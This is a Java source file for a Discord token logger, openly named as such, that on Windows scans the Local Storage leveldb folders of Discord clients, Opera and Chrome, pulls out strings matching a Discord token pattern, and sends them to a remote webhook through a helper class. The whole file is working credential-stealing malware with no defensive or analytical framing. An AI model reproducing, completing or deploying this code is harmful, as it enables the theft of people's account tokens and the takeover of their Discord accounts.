package halq.troll.troll.moment;

import halq.troll.troll.moment.utils.WebhookUtil;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author PeterDev
 * @since 04/09/2022
 * hahahahaha ezzzz
 */

public class discordtokenloggerhahaha {
    public static String whatOS = System.getProperty("os.name");

    public static void getTokens() {
        if(whatOS.contains("Windows")) {
            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");

            int cx = 0;
            StringBuilder webhooks = new StringBuilder();

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();

                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {
                                Pattern p = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }

                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }
                            }
                        } catch (Exception ignored) {
                        }
                    }
                }
                WebhookUtil.main("```Discord Tokens: \n" + webhooks.toString() + "```");
            } catch (Exception e) {
                WebhookUtil.main("```UNABLE TO PULL TOKENS: " + e + "```");
            }
        }
    }
}
